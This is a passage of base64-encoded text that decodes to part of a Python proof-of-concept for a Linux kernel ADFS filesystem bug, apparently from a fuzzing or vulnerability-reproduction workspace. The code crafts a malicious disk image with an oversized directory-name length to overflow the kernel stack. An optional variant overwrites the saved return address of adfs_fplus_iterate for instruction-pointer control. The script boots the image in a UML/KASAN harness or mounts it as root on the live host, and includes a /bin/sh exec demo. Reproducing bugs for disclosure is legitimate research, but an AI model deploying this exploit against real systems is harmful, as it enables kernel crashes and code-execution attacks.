-b20oJzxJJywgZGlyYnVmLCBvZmYgKyBpKVswXQogICAgICAgICAgICBkaXJjaGVjayA9IF9yb3Iz
-MihkaXJjaGVjaywgMTMpIF4gdwogICAgICAgICAgICBpICs9IDQKICAgICAgICBvZmYgKz0gYnMK
-ICAgICAgICByZW1haW5pbmcgLT0gYnMKICAgIHJldHVybiBkaXJjaGVjawoKCmRlZiBidWlsZF9h
-ZGZzX2ltYWdlKG92ZXJmbG93X25hbWVsZW49NTEyLCBuYW1lX2ZpbGw9MHg0MSwgYXR0cj0weDMz
-LAogICAgICAgICAgICAgICAgICAgICByZXRfb2Zmc2V0PU5vbmUsIHJldF92YWx1ZT1Ob25lKToK
-ICAgICIiIlJldHVybiBieXRlcyBvZiBhIG1pbmltYWwgQURGUyBGKyBpbWFnZSB3aG9zZSBlbnRy
-eSAwIGhhcwogICAgYmlnZGlyb2JuYW1lbGVuPW92ZXJmbG93X25hbWVsZW4gKD4yNjApIGFuZCBu
-YW1lIGJ5dGVzID0gbmFtZV9maWxsLgoKICAgIElmIHJldF9vZmZzZXQgaXMgc2V0LCBhbiA4LWJ5
-dGUgbGl0dGxlLWVuZGlhbiByZXRfdmFsdWUgaXMgcGxhbnRlZCBhdAogICAgbmFtZVtyZXRfb2Zm
-c2V0Li5yZXRfb2Zmc2V0KzgpLiBUaGlzIGlzIHRoZSBSSVAtY29udHJvbCB2YXJpYW50CiAgICAo
-b3ZlcmZsb3dfbmFtZWxlbj0zODgsIGF0dHI9MHgzYiwgcmV0X29mZnNldD0zODApIHRoYXQgbGFu
-ZHMgb24KICAgIGFkZnNfZnBsdXNfaXRlcmF0ZSdzIHNhdmVkIHJldHVybiBhZGRyZXNzLiBuYW1l
-WzAuLjRdICh0aGUgb25seSBuYW1lIGJ5dGVzCiAgICBjb3ZlcmVkIGJ5IHRoZSBiaWdkaXIgY2hl
-Y2tieXRlKSBpcyBsZWZ0IGFzIG5hbWVfZmlsbCBzbyB0aGUgY2hlY2tieXRlIGhvbGRzLiIiIgog
-ICAgaW1nID0gYnl0ZWFycmF5KElNR19TSVpFKQoKICAgICMgLS0tLSBibG9jayAwOiBtYXAgem9u
-ZSAwICsgZGlzYyByZWNvcmQgKGRyMCBwYXRoLCBkaXNjIHJlY29yZCBAIGJ5dGUgNCkgLS0tLQog
-ICAgem9uZSA9IGJ5dGVhcnJheSg1MTIpCiAgICB6b25lWzNdID0gMHhmZiAgICAgICAgICAgICAg
-ICAgICAgICAgIyBjcm9zc2NoZWNrIChzaW5nbGUgem9uZSAtPiAweGZmKQogICAgZHIgPSBieXRl
-YXJyYXkoNjApCiAgICBkclswXSAgPSBMT0cyU0VDU0laRQogICAgZHJbMV0gID0gMTsgZHJbMl0g
-PSAxOyBkclszXSA9IDAKICAgIGRyWzRdICA9IElETEVOCiAgICBkcls1XSAgPSBMT0cyQlBNQgog
-ICAgZHJbNl0gID0gMDsgZHJbN10gPSAwOyBkcls4XSA9IDAKICAgIGRyWzldICA9IE5aT05FUwog
-ICAgZHJbMTA6MTJdID0gX2xlMTYoWk9ORV9TUEFSRSkKICAgIGRyWzEyOjE2XSA9IF9sZTMyKFJP
-T1RfSU5EREFERFIpCiAgICBkclsxNjoyMF0gPSBfbGUzMihESVNDX1NJWkUpCiAgICBkclsyMDoy
-Ml0gPSBfbGUxNigwKQogICAgZHJbMzI6MzZdID0gX2xlMzIoMCkKICAgIGRyWzM2OjQwXSA9IF9s
-ZTMyKDApICAgICAgICAgICAgICAgICAjIGRpc2Nfc2l6ZV9oaWdoIG11c3QgYmUgMAogICAgZHJb
-NDBdID0gKExPRzJTSEFSRVNJWkUgJiAweDBmKQogICAgZHJbNDFdID0gMHgwMSAgICAgICAgICAg
-ICAgICAgICAgICAgICMgYmlnX2ZsYWc9MQogICAgZHJbNDJdID0gMDsgZHJbNDNdID0gMAogICAg
-ZHJbNDQ6NDhdID0gX2xlMzIoRk9STUFUX1ZFUlNJT04pCiAgICBkcls0ODo1Ml0gPSBfbGUzMihS
-T09UX1NJWkUpCiAgICB6b25lWzQ6NjRdID0gZHIKCiAgICAjIGZyYWdtZW50IGJpdHN0cmVhbSBz
-dGFydGluZyBhdCBiaXQgNTEyCiAgICBfc2V0X2JpdCh6b25lLCA1MTIsIDEpICAgICAgICAgICAg
-ICAgIyBmcmFnX2lkPTEgKGR1bW15KQogICAgX3NldF9iaXQoem9uZSwgNTI0LCAxKSAgICAgICAg
-ICAgICAgICMgdGVybWluYXRvciBBCiAgICBfc2V0X2JpdCh6b25lLCA1MjYsIDEpICAgICAgICAg
-ICAgICAgIyBmcmFnX2lkPTIgYml0MSAoMGIxMCkKICAgIF9zZXRfYml0KHpvbmUsIDUzNywgMSkg
-ICAgICAgICAgICAgICAjIHRlcm1pbmF0b3IgQiAgLT4gcm9vdCBmcmFnIC0+IGJsb2NrIDEzCgog
-ICAgem9uZVswXSA9IDAKICAgIHpvbmVbMF0gPSBfY2FsY196b25lY2hlY2soem9uZSkKICAgIGlt
-Z1swOjUxMl0gPSB6b25lCgogICAgIyAtLS0tIGJsb2NrcyAxMy0xNjogcm9vdCBkaXJlY3Rvcnkg
-KEYrIGJpZ2RpciwgMjA0OCBieXRlcykgLS0tLQogICAgQklHRElSX05BTUxFTiA9IDQKICAgIEJJ
-R0RJUl9OQU1FU0laRSA9IDQKICAgIEJJR0RJUl9FTlRSSUVTID0gMQogICAgYmlnZGlyID0gYnl0
-ZWFycmF5KDIwNDgpCgogICAgYmlnZGlyWzA6NF0gPSBieXRlcyg0KSAgICAgICAgICAgICAgICAg
-ICAgICAgICAgIyBzdGFydG1hc3NlcSArIGJpZ2RpcnZlcnNpb24KICAgIGJpZ2Rpcls0OjhdID0g
-X2xlMzIoQklHRElSU1RBUlROQU1FKQogICAgYmlnZGlyWzg6MTJdID0gX2xlMzIoQklHRElSX05B
-TUxFTikKICAgIGJpZ2RpclsxMjoxNl0gPSBfbGUzMigyMDQ4KQogICAgYmlnZGlyWzE2OjIwXSA9
-IF9sZTMyKEJJR0RJUl9FTlRSSUVTKQogICAgYmlnZGlyWzIwOjI0XSA9IF9sZTMyKEJJR0RJUl9O
-QU1FU0laRSkKICAgIGJpZ2RpclsyNDoyOF0gPSBfbGUzMihST09UX0lORERBRERSKSAgICAgICAg
-ICAgICMgYmlnZGlycGFyZW50CiAgICBiaWdkaXJbMjg6MzJdID0gYidyb290JyAgICAgICAgICAg
-ICAgICAgICAgICAgICAjIGJpZ2Rpcm5hbWUKCiAgICBlb2ZmID0gMzIgICAgICAgICAgICAgICAg
-ICAgICAgICAgICAgICAgICAgICAgICAjIGFkZnNfYmlnZGlyZW50cnkgKGVudHJ5IDApCiAgICBi
-aWdkaXJbZW9mZiswOmVvZmYrNF0gICA9IF9sZTMyKDApICAgICAgICAgICAgICAjIGJpZ2Rpcmxv
-YWQKICAgIGJpZ2Rpcltlb2ZmKzQ6ZW9mZis4XSAgID0gX2xlMzIoMCkgICAgICAgICAgICAgICMg
-YmlnZGlyZXhlYwogICAgYmlnZGlyW2VvZmYrODplb2ZmKzEyXSAgPSBfbGUzMigwKSAgICAgICAg
-ICAgICAgIyBiaWdkaXJsZW4KICAgIGJpZ2Rpcltlb2ZmKzEyOmVvZmYrMTZdID0gX2xlMzIoMHgw
-MDAwMDMwMCkgICAgICMgYmlnZGlyaW5kYWRkciAoZnJhZyAzKQogICAgYmlnZGlyW2VvZmYrMTY6
-ZW9mZisyMF0gPSBfbGUzMihhdHRyKSAgICAgICAgICAgICMgYmlnZGlyYXR0ciAoMHgzMyBkZWZh
-dWx0OyAweDNiIGZvciBSSVApCiAgICBiaWdkaXJbZW9mZisyMDplb2ZmKzI0XSA9IF9sZTMyKG92
-ZXJmbG93X25hbWVsZW4pICAjICoqKiBiaWdkaXJvYm5hbWVsZW4gVFJJR0dFUiAqKioKICAgIGJp
-Z2Rpcltlb2ZmKzI0OmVvZmYrMjhdID0gX2xlMzIoMCkgICAgICAgICAgICAgICMgYmlnZGlyb2Ju
-YW1lcHRyCgogICAgbmFtZV9vZmYgPSA2MCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICAgIyBuYW1lcyBhcmVhIChjaGVja2J5dGUgY292ZXJzIG9ubHkgWzYwLi42NCkpCiAgICBmb3Ig
-aSBpbiByYW5nZShvdmVyZmxvd19uYW1lbGVuKToKICAgICAgICBiaWdkaXJbbmFtZV9vZmYgKyBp
-XSA9IG5hbWVfZmlsbAogICAgaWYgcmV0X29mZnNldCBpcyBub3QgTm9uZSBhbmQgcmV0X3ZhbHVl
-IGlzIG5vdCBOb25lOgogICAgICAgICMgUGxhbnQgdGhlIGNvbnRyb2xsZWQgc2F2ZWQgcmV0dXJu
-IGFkZHJlc3MgKFJJUC1jb250cm9sIHZhcmlhbnQpLgogICAgICAgIHJ2ID0gc3RydWN0LnBhY2so
-JzxRJywgcmV0X3ZhbHVlICYgMHhGRkZGRkZGRkZGRkZGRkZGKQogICAgICAgIGZvciBpIGluIHJh
-bmdlKDgpOgogICAgICAgICAgICBiaWdkaXJbbmFtZV9vZmYgKyByZXRfb2Zmc2V0ICsgaV0gPSBy
-dltpXQoKICAgIHRvZmYgPSAyMDQ4IC0gOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
-ICMgYWRmc19iaWdkaXJ0YWlsCiAgICBiaWdkaXJbdG9mZjp0b2ZmKzRdID0gX2xlMzIoQklHRElS
-RU5ETkFNRSkKICAgIGJpZ2Rpclt0b2ZmKzRdID0gMDsgYmlnZGlyW3RvZmYrNV0gPSAwOyBiaWdk
-aXJbdG9mZis2XSA9IDAKCiAgICBlbmQgPSAoMjggKyAoKEJJR0RJUl9OQU1MRU4gKyAzKSAmIH4z
-KSArIEJJR0RJUl9FTlRSSUVTICogMjgpICsgQklHRElSX05BTUVTSVpFCiAgICBkYyA9IF9jYWxj
-X2JpZ2Rpcl9jaGVja2J5dGUoYmlnZGlyLCBlbmQpCiAgICBkYyA9IF9yb3IzMihkYywgMTMpIF4g
-QklHRElSRU5ETkFNRQogICAgZGMgPSBfcm9yMzIoZGMsIDEzKSBeIDAKICAgIGRjID0gX3JvcjMy
-KGRjLCAxMykgXiAwCiAgICBkYyA9IF9yb3IzMihkYywgMTMpIF4gMAogICAgYmlnZGlyW3RvZmYg
-KyA3XSA9IChkYyBeIChkYyA+PiA4KSBeIChkYyA+PiAxNikgXiAoZGMgPj4gMjQpKSAmIDB4ZmYK
-CiAgICBpbWdbMTMgKiBCTEs6MTMgKiBCTEsgKyAyMDQ4XSA9IGJpZ2RpcgogICAgcmV0dXJuIGJ5
-dGVzKGltZykKCgpkZWYgc2FuaXR5X2NoZWNrX2ltYWdlKGRhdGEsIG92ZXJmbG93X25hbWVsZW4p
-OgogICAgIiIiQ2hlYXAgc3RydWN0dXJhbCBhc3NlcnRpb25zIHNvIGEgYmFkIGNyYWZ0ZXIgZmFp
-bHMiIiIKICAgIGFzc2VydCBsZW4oZGF0YSkgPT0gSU1HX1NJWkUsIGxlbihkYXRhKQogICAgYmln
-ZGlyID0gZGF0YVsxMyAqIEJMSzoxMyAqIEJMSyArIDIwNDhdCiAgICBhc3NlcnQgYmlnZGlyWzQ6
-OF0gPT0gX2xlMzIoQklHRElSU1RBUlROQU1FKSwgImJpZ2RpcnN0YXJ0bmFtZSBtaXNtYXRjaCIK
-ICAgIGFzc2VydCBzdHJ1Y3QudW5wYWNrX2Zyb20oJzxJJywgYmlnZGlyLCBlb2ZmIDo9IDMyICsg
-MjApWzBdID09IG92ZXJmbG93X25hbWVsZW4sIFwKICAgICAgICAiYmlnZGlyb2JuYW1lbGVuIG5v
-dCBzZXQiCiAgICBhc3NlcnQgYmlnZGlyWzIwNDA6MjA0NF0gPT0gX2xlMzIoQklHRElSRU5ETkFN
-RSksICJiaWdkaXJlbmRuYW1lIG1pc21hdGNoIgogICAgcmV0dXJuIFRydWUKCgojID09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PQojIDIuIFVNTC9LQVNBTiBiYWNrZW5kIChzYWZlLCBkZWZhdWx0KQojID09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PQoKQURGU19GVU5DUyA9ICgiYWRmc19vYmplY3RfZml4dXAiLCAiYWRmc19m
-cGx1c19nZXRuZXh0IiwgImFkZnNfZnBsdXNfaXRlcmF0ZSIpCgoKZGVmIHJ1bl91bWwoa2VybmVs
-LCBpbml0cmFtZnMsIGltYWdlLCB0aW1lb3V0PTQwLCBtZW09IjJHIiwgbG9nX3BhdGg9Tm9uZSk6
-CiAgICAiIiJCb290IFVNTCB3aXRoIHRoZSBpbWFnZSwgdHJpZ2dlciByZWFkZGlyLCByZXR1cm4g
-Y2FwdHVyZWQgY29uc29sZSB0ZXh0LiIiIgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGtlcm5l
-bCk6CiAgICAgICAgcmFpc2UgRmlsZU5vdEZvdW5kRXJyb3IoZiJVTUwga2VybmVsIG5vdCBmb3Vu
-ZDoge2tlcm5lbH0iKQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGluaXRyYW1mcyk6CiAgICAg
-ICAgcmFpc2UgRmlsZU5vdEZvdW5kRXJyb3IoZiJpbml0cmFtZnMgbm90IGZvdW5kOiB7aW5pdHJh
-bWZzfSIpCiAgICBjbWQgPSBbCiAgICAgICAga2VybmVsLAogICAgICAgIGYiaW5pdHJkPXtpbml0
-cmFtZnN9IiwKICAgICAgICBmInViZDA9e2ltYWdlfSIsCiAgICAgICAgImNvbjA9ZmQ6MCxmZDox
-IiwgImNvbj1ub25lIiwKICAgICAgICBmIm1lbT17bWVtfSIsICJsb2dsZXZlbD04IiwgInBhbmlj
-PTAiLAogICAgICAgICJBQ1RJT049cmVhZGRpciIsICJGU1Q9YWRmcyIsICJVQkRERVY9L2Rldi91
-YmRhIiwgIk1PUFRTPXJvIiwKICAgIF0KICAgIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVuKGNtZCwg
-c3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuU1RET1VULAogICAgICAg
-ICAgICAgICAgICAgICAgICAgICAgdGV4dD1UcnVlLCBidWZzaXplPTEpCiAgICB0cnk6CiAgICAg
-ICAgb3V0LCBfID0gcHJvYy5jb21tdW5pY2F0ZSh0aW1lb3V0PXRpbWVvdXQpCiAgICAgICAgcmMg
-PSBwcm9jLnJldHVybmNvZGUKICAgICAgICB0aW1lZF9vdXQgPSBGYWxzZQogICAgZXhjZXB0IHN1
-YnByb2Nlc3MuVGltZW91dEV4cGlyZWQ6CiAgICAgICAgcHJvYy5raWxsKCkKICAgICAgICBvdXQs
-IF8gPSBwcm9jLmNvbW11bmljYXRlKCkKICAgICAgICByYyA9IHByb2MucmV0dXJuY29kZQogICAg
-ICAgIHRpbWVkX291dCA9IFRydWUKICAgIGlmIGxvZ19wYXRoOgogICAgICAgIHdpdGggb3Blbihs
-b2dfcGF0aCwgInciKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKG91dCkKICAgIHJldHVybiBv
-dXQsIHJjLCB0aW1lZF9vdXQKCgpkZWYgcGFyc2Vfb3V0cHV0KG91dCk6CiAgICAiIiJDbGFzc2lm
-eSBjYXB0dXJlZCBjb25zb2xlIG91dHB1dC4gUmV0dXJucyBhIGRpY3Qgb2Ygc2lnbmFscy4iIiIK
-ICAgIG1vdW50X29rID0gYm9vbChyZS5zZWFyY2gociJtb3VudCByYz0wfG1vdW50ZWQgT0siLCBv
-dXQpKQogICAga2FzYW4gPSAiQlVHOiBLQVNBTjogc3RhY2stb3V0LW9mLWJvdW5kcyIgaW4gb3V0
-CiAgICBhZGZzX2hpdHMgPSBbZiBmb3IgZiBpbiBBREZTX0ZVTkNTIGlmIGYgaW4gb3V0XQogICAg
-b2JqX2ZyYW1lID0gYm9vbChyZS5zZWFyY2gociJcWzMyLFxzKjMyMFwpfCdvYmonIiwgb3V0KSkK
-ICAgIHBhbmljID0gKCJLZXJuZWwgcGFuaWMiIGluIG91dCkgb3IgKCJLZXJuZWwgbW9kZSBmYXVs
-dCIgaW4gb3V0KQogICAgY2hrX2ZhaWwgPSAiX19zdGFja19jaGtfZmFpbCIgaW4gb3V0CiAgICBj
-b250cm9sbGVkID0gYm9vbChyZS5zZWFyY2gociI0MTQxNDE0MTQxNDE0MTQxfFIoPzoxWzAtNV18
-OHw5fFtBLURdKT0weDQxNDEiLCBvdXQpKQogICAgcmV0dXJuIGRpY3QobW91bnRfb2s9bW91bnRf
-b2ssIGthc2FuPWthc2FuLCBhZGZzX2hpdHM9YWRmc19oaXRzLAogICAgICAgICAgICAgICAgb2Jq
-X2ZyYW1lPW9ial9mcmFtZSwgcGFuaWM9cGFuaWMsIGNoa19mYWlsPWNoa19mYWlsLAogICAgICAg
-ICAgICAgICAgY29udHJvbGxlZD1jb250cm9sbGVkKQoKCmRlZiBldmlkZW5jZV9leGNlcnB0KG91
-dCwgbWF4X2NoYXJzPTE2MDApOgogICAgaWR4ID0gb3V0LmZpbmQoIkJVRzogS0FTQU4iKQogICAg
-aWYgaWR4IDwgMDoKICAgICAgICBpZHggPSBvdXQuZmluZCgiS2VybmVsIHBhbmljIikKICAgIGlm
-IGlkeCA8IDA6CiAgICAgICAgaWR4ID0gbWF4KDAsIGxlbihvdXQpIC0gbWF4X2NoYXJzKQogICAg
-cmV0dXJuIG91dFtpZHg6aWR4ICsgbWF4X2NoYXJzXS5yc3RyaXAoKQoKCmRlZiBwYXJzZV9yaXAo
-b3V0LCByZXRfdmFsdWUpOgogICAgIiIiRGV0ZWN0IHdoZXRoZXIgdGhlIHBsYW50ZWQgcmV0dXJu
-IGFkZHJlc3MgYWN0dWFsbHkgcmVkaXJlY3RlZCBSSVAuCgogICAgQ2Fub25pY2FsIHBsYW50ZWQg
-dmFsdWUgIC0+IGByZXRgIGNvbXBsZXRlczsgZmF1bHRpbmcgSVAgPT0gcGxhbnRlZCB2YWx1ZS4K
-ICAgIE5vbi1jYW5vbmljYWwgdmFsdWUgICAgICAtPiBDUFUgZmF1bHRzIEFUIHRoZSBgcmV0YCBp
-bnN0cnVjdGlvbiBpbnN0ZWFkCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKHN5bWJv
-bCBhZGZzX2ZwbHVzX2l0ZXJhdGUrMHgyNmQgb24gdGhpcyBidWlsZCkuIiIiCiAgICByZXRfdmFs
-dWUgJj0gMHhGRkZGRkZGRkZGRkZGRkZGCiAgICBtID0gcmUuc2VhcmNoKHIiS2VybmVsIG1vZGUg
-ZmF1bHQgYXQgYWRkciAweFswLTlhLWZdKyxccyppcCAweChbMC05YS1mXSspIiwgb3V0KQogICAg
-ZmF1bHRfaXAgPSBpbnQobS5ncm91cCgxKSwgMTYpIGlmIG0gZWxzZSBOb25lCiAgICBjYW5vbmlj
-YWxfaGl0ID0gKGZhdWx0X2lwID09IHJldF92YWx1ZSkKICAgICMgMHgyNmQgPT0gb2Zmc2V0IG9m
-IHRoZSBgcmV0YCBpbiBhZGZzX2ZwbHVzX2l0ZXJhdGUgb24gdGhlIDcuMC4xIFVNTCBidWlsZC4K
-ICAgIHJldF9mYXVsdCA9IGJvb2wocmUuc2VhcmNoKHIiYWRmc19mcGx1c19pdGVyYXRlXCsweDI2
-WzAtOWEtZl0vIiwgb3V0KSkKICAgIHZhbHVlX3NlZW4gPSAoZiJ7cmV0X3ZhbHVlOnh9IiBpbiBv
-dXQubG93ZXIoKSkKICAgIHJldHVybiBkaWN0KGZhdWx0X2lwPSgiMHgleCIgJSBmYXVsdF9pcCBp
-ZiBmYXVsdF9pcCBpcyBub3QgTm9uZSBlbHNlIE5vbmUpLAogICAgICAgICAgICAgICAgY2Fub25p
-Y2FsX2hpdD1jYW5vbmljYWxfaGl0LCByZXRfZmF1bHQ9cmV0X2ZhdWx0LCB2YWx1ZV9zZWVuPXZh
-bHVlX3NlZW4pCgoKIyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KIyAzLiBIb3N0IGJhY2tlbmQKIyA9PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT0KCmRlZiBfc2goY21kLCBjaGVjaz1UcnVlKToKICAgIHJldHVybiBzdWJw
-cm9jZXNzLnJ1bihjbWQsIHNoZWxsPVRydWUsIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1
-ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICBjaGVjaz1jaGVjaykuc3Rkb3V0CgoKZGVmIHJ1
-bl9ob3N0KGltYWdlLCBtbnQpOgogICAgIiIiTW91bnQgdGhlIGltYWdlIG9uIHRoZSBsaXZlIGhv
-c3Qga2VybmVsIGFuZCBsaXN0IGl0LiBDQU4gQ1JBU0ggVEhFIEhPU1QuIiIiCiAgICBpZiBvcy5n
-ZXRldWlkKCkgIT0gMDoKICAgICAgICByYWlzZSBTeXN0ZW1FeGl0KCJob3N0IG1vZGUgcmVxdWly
-ZXMgcm9vdCAoQ0FQX1NZU19BRE1JTiB0byBtb3VudCkiKQogICAgX3NoKCJtb2Rwcm9iZSBhZGZz
-IDI+L2Rldi9udWxsIHx8IHRydWUiLCBjaGVjaz1GYWxzZSkKICAgIGJlZm9yZSA9IF9zaCgiam91
-cm5hbGN0bCAtayAtLW5vLXBhZ2VyIC1uIDAgLS1zaW5jZSAnMSBtaW4gYWdvJyAyPi9kZXYvbnVs
-bCB8fCAiCiAgICAgICAgICAgICAgICAgImRtZXNnIHwgdGFpbCAtbiA1IiwgY2hlY2s9RmFsc2Up
-CiAgICBsb29wID0gTm9uZQogICAgb3V0ID0gW10KICAgIHRyeToKICAgICAgICBsb29wID0gX3No
-KCJsb3NldHVwIC1mUCAtLXNob3cgIiArIGltYWdlKS5zdHJpcCgpCiAgICAgICAgb3V0LmFwcGVu
-ZChmImxvb3A9e2xvb3B9IikKICAgICAgICBtbnRyZXMgPSBfc2goZiJtb3VudCAtdCBhZGZzIC1v
-IHJvIHtsb29wfSB7bW50fSAyPiYxIiwgY2hlY2s9RmFsc2UpCiAgICAgICAgb3V0LmFwcGVuZChm
-Im1vdW50OiB7bW50cmVzLnN0cmlwKCkgb3IgJ29rJ30iKQogICAgICAgIGlmIG9zLnBhdGguaXNt
-b3VudChtbnQpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRyaWVzID0gb3Mu
-bGlzdGRpcihtbnQpCiAgICAgICAgICAgICAgICBvdXQuYXBwZW5kKGYibGlzdGRpciBvazoge2Vu
-dHJpZXNbOjVdfSIpCiAgICAgICAgICAgIGV4Y2VwdCBPU0Vycm9yIGFzIGU6CiAgICAgICAgICAg
-ICAgICBvdXQuYXBwZW5kKGYibGlzdGRpciByYWlzZWQ6IHtlIXJ9IChvZnRlbiBtZWFucyB0aGUg
-b3ZlcmZsb3cgdHJpcHBlZCkiKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIG91dC5hcHBlbmQo
-Im5vdCBtb3VudGVkIChhZGZzIHJlamVjdGVkIHRoZSBpbWFnZSkiKQogICAgZmluYWxseToKICAg
-ICAgICBfc2goZiJ1bW91bnQge21udH0gMj4vZGV2L251bGwgfHwgdHJ1ZSIsIGNoZWNrPUZhbHNl
-KQogICAgICAgIGlmIGxvb3A6CiAgICAgICAgICAgIF9zaChmImxvc2V0dXAgLWQge2xvb3B9IDI+
-L2Rldi9udWxsIHx8IHRydWUiLCBjaGVjaz1GYWxzZSkKICAgIGFmdGVyID0gX3NoKCJkbWVzZyB8
-IHRhaWwgLW4gNjAiLCBjaGVjaz1GYWxzZSkKICAgIHJldHVybiAiXG4iLmpvaW4ob3V0KSwgYWZ0
-ZXIKCgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PQojIDQuIEVMRiBleGVjdXRpb24gZGVtbyAoLS1leGVj
-LWRlbW8pOiB0cmlnZ2VyIGV4ZWMoKSBvbiAvYmluL3NoIGZvciBjb25maXJtYXRpb24KIyA9PT09
-PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
-PT09PT09PT09PT09PT0KCmRlZiBleGVjX2RlbW8oc2g9Ii9iaW4vc2ggd2hvYW1pIik6CiAgICAi
-IiJWaXN1YWxseSBjb25maXJtIEVMRiBleGVjdXRpb246IHByb3ZlIC9iaW4vc2ggJiBscyBhcmUg
-RUxGIGJpbmFyaWVzLCB0aGVuCiAgICBhY3R1YWxseSB0cmlnZ2VyIGV4ZWMoKSB0byBsb2FkIGFu
-ZCBydW4gdGhlbSAoc3VicHJvY2VzcyBmb3JrK2V4ZWN2ZSwgYW5kIGEKICAgIHJhdyBvcy5mb3Jr
-KCkrb3MuZXhlY3YoKSB0aGF0IHJlcGxhY2VzIGEgY2hpbGQncyBpbWFnZSB3aXRoIC9iaW4vc2gp
-LiIiIgogICAgYmFyID0gIj0iICogNjQKICAgIHRyeToKICAgICAgICBzeXMuc3Rkb3V0LnJlY29u
-ZmlndXJlKGxpbmVfYnVmZmVyaW5nPVRydWUpICAgIyBrZWVwIHByaW50IG9yZGVyIGNvcnJlY3Qg
-dW5kZXIgcGlwZXMKICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgcGFzcwogICAgcHJpbnQo
-YmFyKQogICAgcHJpbnQoIkVMRiBFWEVDVVRJT04gREVNTyAgLS0gIHRyaWdnZXJpbmcgZXhlYygp
-IikKICAgIHByaW50KGJhcikKCiAgICBscyA9IHNodXRpbC53aGljaCgibHMiKSBvciAiL3Vzci9i
-aW4vbHMiCiAgICBoYXZlID0ge3Q6IHNodXRpbC53aGljaCh0KSBmb3IgdCBpbiAoImZpbGUiLCAi
-cmVhZGVsZiIpfQoKICAgIHByaW50KCJcbiMjIyAxLiBUaGUgdGFyZ2V0cyBhcmUgRUxGIGJpbmFy
-aWVzIikKICAgIGZvciBsYWJlbCwgcGF0aCBpbiAoKCJzaCIsIHNoKSwgKCJscyIsIGxzKSk6CiAg
-ICAgICAgcHJpbnQoZiIgIHtsYWJlbDo0fSAtPiB7cGF0aH0iKQogICAgICAgIGlmIGhhdmVbImZp
-bGUiXToKICAgICAgICAgICAgb3V0ID0gc3VicHJvY2Vzcy5ydW4oW2hhdmVbImZpbGUiXSwgcGF0
-aF0sCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNhcHR1cmVfb3V0cHV0PVRydWUs
-IHRleHQ9VHJ1ZSkuc3Rkb3V0LnN0cmlwKCkKICAgICAgICAgICAgcHJpbnQoZiIgICAgICAge291
-dH0iKQoKICAgIGlmIGhhdmVbInJlYWRlbGYiXToKICAgICAgICBwcmludChmIlxuIyMjIDIuIEVM
-RiBoZWFkZXIgb2Yge3NofSAgKHJlYWRlbGYgLWgpIikKICAgICAgICBvdXQgPSBzdWJwcm9jZXNz
-LnJ1bihbaGF2ZVsicmVhZGVsZiJdLCAiLWgiLCBzaF0sCiAgICAgICAgICAgICAgICAgICAgICAg
-ICAgICAgY2FwdHVyZV9vdXRwdXQ9VHJ1ZSwgdGV4dD1UcnVlKS5zdGRvdXQKICAgICAgICBmb3Ig
-bGluZSBpbiBvdXQuc3BsaXRsaW5lcygpWzoxNF06CiAgICAgICAgICAgIHByaW50KCIgICAiLCBs
-aW5lKQoKICAgIHByaW50KCJcbiMjIyAzLiBleGVjKCkgdmlhIHN1YnByb2Nlc3M6IC9iaW4vc2gg
-LWMgJy4uLicgICAoZm9yaywgdGhlbiBleGVjdmUgL2Jpbi9zaCkiKQogICAgc2NyaXB0ID0gKAog
-ICAgICAgICJlY2hvICdzaGVsbDogZXhlYyBzdWNjZWVkZWQgLS0gL2Jpbi9zaCAoYW4gRUxGKSBp
-cyBub3cgcnVubmluZyc7ICIKICAgICAgICAiZWNobyBcImlkZW50aXR5OiAkKGJhc2VuYW1lIFwi
-JDBcIikgcGlkPSQkXCI7ICIKICAgICAgICAiZWNobyAnLS0tIGxzIChhbHNvIGFuIEVMRikgZXhl
-Y3V0aW5nIC0tLSc7ICIKICAgICAgICAibHMgLWxhIC0tY29sb3I9bmV2ZXIgL2hvbWUvbG9jYWxo
-b3N0L2xpbnV4L2Z1enotd29ya3NwYWNlL3BvYyAyPi9kZXYvbnVsbCB8IGhlYWQgLW4gODsgIgog
-ICAgICAgICJlY2hvICctLS0gdW5hbWUgLS0tJzsgdW5hbWUgLXNybSIKICAgICkKICAgIHIgPSBz
-dWJwcm9jZXNzLnJ1bihbc2gsICItYyIsIHNjcmlwdF0sIGNhcHR1cmVfb3V0cHV0PVRydWUsIHRl
-eHQ9VHJ1ZSkKICAgIHN5cy5zdGRvdXQud3JpdGUoci5zdGRvdXQpCiAgICBpZiByLnJldHVybmNv
-ZGUgIT0gMCBhbmQgci5zdGRlcnIuc3RyaXAoKToKICAgICAgICBwcmludChmIltzdGRlcnJdIHty
-LnN0ZGVyci5zdHJpcCgpfSIpCgogICAgcHJpbnQoIlxuIyMjIDQuIHJhdyBleGVjdmUoKTogYSBj
-aGlsZCByZXBsYWNlcyBpdHMgb3duIHByb2Nlc3MgaW1hZ2Ugd2l0aCAvYmluL3NoIikKICAgIHN5
